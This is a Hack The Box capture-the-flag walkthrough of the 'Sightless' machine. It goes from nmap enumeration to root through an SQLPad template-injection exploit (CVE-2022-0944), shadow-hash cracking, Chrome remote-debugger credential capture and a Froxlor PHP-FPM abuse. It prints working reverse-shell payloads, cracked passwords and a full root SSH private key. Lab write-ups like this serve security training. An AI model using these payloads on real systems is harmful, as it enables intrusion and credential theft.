# HTB : Sightless

Tags: Easy
Date Completed: January 10, 2025
Status: Yes
OS: Linux

# Initial Enumeration

### Port Scan

```bash
# Nmap 7.95 scan initiated Thu Jan  9 14:18:41 2025 as: nmap -sCV -vv -p- -oA nmap/Sightless --min-rate 5000 10.10.11.32
Nmap scan report for 10.10.11.32
Host is up, received reset ttl 63 (0.072s latency).
Scanned at 2025-01-09 14:18:41 IST for 81s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGoivagBalUNqQKPAE2WFpkFMj+vKwO9D3RiUUxsnkBNKXp5ql1R+kvjG89Iknc24EDKuRWDzEivKXYrZJE9fxg=
|   256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA4BBc5R8qY5gFPDOqODeLBteW5rxF+qR5j36q9mO+bu
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://sightless.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.95%I=7%D=1/9%Time=677F8D81%P=arm-apple-darwin23.4.0%r(Ge
SF:nericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20S
SF:erver\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20t
SF:ry\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x2
SF:0being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /opt/homebrew/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan  9 14:20:02 2025 -- 1 IP address (1 host up) scanned in 81.65 seconds
```

### HTTP Port 80 enumeration.

After going through webpages found website is running `sqlpad 6.10.0` 

![image.png](HTB%20Sightless%2017612303b1a280a9be29ed936013b80b/image.png)

# Foothold(User)

### `SQLPAD` CVE([CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944))

[`PoC`](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb) can be found here for exploiting CVE.

```bash
POST /api/test-connection HTTP/1.1
Host: sqlpad.sightless.htb
Content-Length: 365
Expires: -1
Cache-Control: no-cache
Accept-Language: en-GB,en;q=0.9
Accept: application/json
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Origin: http://sqlpad.sightless.htb
Referer: http://sqlpad.sightless.htb/queries/new
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"name":"abc","driver":"mysql","idleTimeoutMinutes":"","multiStatementTransactionEnabled":false,"data":{"database":"{{ process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.13/9001 0>&1\"') }}"},"database":"{{ process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.13/9001 0>&1\"') }}"}
```

```bash
HTTP/1.1 400 Bad Request
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 09 Jan 2025 12:18:44 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 47
Connection: keep-alive
X-DNS-Prefetch-Control: off
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Download-Options: noopen
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Referrer-Policy: same-origin
ETag: W/"2f-dKdftuteidQfC8ZbmlWyKg6Qat8"

{"title":"connect ECONNREFUSED 127.0.0.1:3306"}
```

After running above PoC shell returned as root in docker container.

```bash
~/HTB/Machines/Sightless  pwncat-cs -lp 9001  
[18:04:04] Welcome to pwncat 🐈!                                                                                                                                    __main__.py:164
[18:04:11] received connection from 10.10.11.32:37712                                                                                                                    bind.py:84
[18:04:12] 10.10.11.32:37712: registered new host w/ db                                                                                                              manager.py:957
(local) pwncat$

(remote) root@c184118df0a6:/var/lib/sqlpad# **id**
uid=0(root) gid=0(root) groups=0(root)

(remote) root@c184118df0a6:/var/lib/sqlpad# uname -a
Linux c184118df0a6 5.15.0-119-generic #129-Ubuntu SMP Fri Aug 2 19:25:20 UTC 2024 x86_64 GNU/Linux
```

As we have a root level access in docker we can dump shadow hashes and able to crack the password for `michael` user.

```bash
 (remote) root@c184118df0a6:/# cat /etc/shadow-
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
<snip>
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```

Hashcat cracked the password.

```bash
~/HTB/Machines/Sightless  hashcat hash.txt ~/Tools/SecLists/rockyou.txt --show 
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1800 | sha512crypt $6$, SHA512 (Unix) | Operating System

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:**insaneclownposse**
```

## Successfully able to SSH into machine using user `michael`

```bash
~/HTB/Machines/Sightless  sshpass -p 'insaneclownposse' ssh michael@10.10.11.32 
Last login: Thu Jan  9 13:18:12 2025 from 10.10.14.13
michael@sightless:~$ id
uid=1000(michael) gid=1000(michael) groups=1000(michael)

michael@sightless:~$ uname -a
Linux sightless 5.15.0-119-generic #129-Ubuntu SMP Fri Aug 2 19:25:20 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

michael@sightless:~$ cat user.txt | wc -c
33
```

# PrivEsc(Root)

## Google Chrome Remote Debugger

[linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases) shows server is running google-chrome with debugging on. After following [exploit-notes](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/) article able to capture the password for `froxlor` application.

```bash
john        1208  0.0  0.0   2892   984 ?        Ss   Jan08   0:00      _ /bin/sh -c sleep 110 && /usr/bin/python3 /home/john/automation/administration.py
john        1596  0.0  0.6  33660 24552 ?        S    Jan08   0:34          _ /usr/bin/python3 /home/john/automation/administration.py
john        1597  0.2  0.3 33630172 15272 ?      Sl   Jan08   3:17              _ /home/john/automation/chromedriver --port=55937
john        1608  0.3  2.8 34011320 112528 ?     Sl   Jan08   5:35              |   _ /opt/google/chrome/chrome --allow-pre-commit-input --disable-background-networking --disable-
client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-a$
tomation --enable-logging --headless --log-level=0 --no-first-run --no-sandbox --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mo
ck-keychain --user-data-dir=/tmp/.org.chromium.Chromium.jiba8E data:,
john        1614  0.0  1.4 34112452 55860 ?      S    Jan08   0:00              |       _ /opt/google/chrome/chrome --type=zygote --no-zygote-sandbox --no-sandbox --enable-logging
 --headless --log-level=0 --headless --crashpad-handler-pid=1610 --enable-crash-reporter
john        1631  0.2  3.0 34362348 122524 ?     Sl   Jan08   3:15              |       |   _ /opt/google/chrome/chrome --type=gpu-process --no-sandbox --disable-dev-shm-usage --h
eadless --ozone-platform=headless --use-angle=swiftshader-webgl --headless --crashpad-handler-pid=1610 --gpu-preferences=WAAAAAAAAAAgAAAMAAAAAAAAAAAAAAAAAABgAAEAAAA4AAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --use-gl=angle --shared-files --fie
```

Login details :- `admin:ForlorfroxAdmin`

![image.png](HTB%20Sightless%2017612303b1a280a9be29ed936013b80b/image%201.png)

## Froxlor

Created `PHP-FPM Versions` config with bash script which will trigger reverse shell. Post configuring this we need to enable and disable the `PHP-FPM` 

![image.png](HTB%20Sightless%2017612303b1a280a9be29ed936013b80b/image%202.png)

![image.png](HTB%20Sightless%2017612303b1a280a9be29ed936013b80b/image%203.png)

```bash
michael@sightless:/tmp$ cat alam.sh
#!/bin/bash

bash -i &>/dev/tcp/10.10.14.13/9001 <&1
```

Reverse shell returned successfully.

```bash
~/HTB/Machines/Sightless  pwncat-cs -lp 9001 
[11:37:21] Welcome to pwncat 🐈!                                                                                                                                    __main__.py:164
[11:40:30] received connection from 10.10.11.32:39518                                                                                                                    bind.py:84
[11:40:32] 10.10.11.32:39518: registered new host w/ db                                                                                                              manager.py:957
(local) pwncat$

(remote) root@sightless:/root# id
uid=0(root) gid=0(root) groups=0(root)

(remote) root@sightless:/root# uname -a
Linux sightless 5.15.0-119-generic #129-Ubuntu SMP Fri Aug 2 19:25:20 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

(remote) root@sightless:/root# cat root.txt | wc -c
33

(remote) root@sightless:/root/.ssh# cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```